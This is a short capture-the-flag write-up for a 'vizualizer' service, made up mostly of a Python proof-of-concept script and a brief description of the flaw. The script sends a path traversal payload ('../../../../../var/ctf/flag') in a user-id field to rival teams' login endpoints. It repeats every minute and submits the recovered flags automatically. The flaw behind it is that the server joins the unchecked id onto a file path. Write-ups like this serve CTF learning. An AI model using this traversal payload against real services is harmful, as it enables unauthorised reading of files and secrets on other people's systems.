# Writeup for vizualizer service

## PoC code
```python
import requests
from submitOpen import send
from time import sleep

def q(host):
    data = {'id': '../../../../../var/ctf/flag'}
    r = requests.post(host, data=data)
    return r.text

host_list = [
        ('http://localhost:12341/login', 'Team 1'),
        ('http://localhost:12342/login', 'Team 3'),
        ('http://localhost:12343/login', 'Team 4'),
        ('http://localhost:12344/login', 'Team 5'),
        ('http://localhost:12345/login', 'Team TA'),
        ]

def attack():
    for h, tn in host_list:
        try:
            a = q(h)
            key = a.split('\n')[-1]
            print tn
            print repr(key)
            send('Team 2', tn, 'Visualizer', key)
        except Exception:
            print Exception.msg
            pass

while True:
    attack()
    print '-------------------------------------------'
    sleep(60)
```

## Description

When getting user's id at a first page, server doesn't check whether
given input is valid or not. Since server finds user's public key with
concatnating paths, we can simply inject path of flag at user's id field to
get flag.
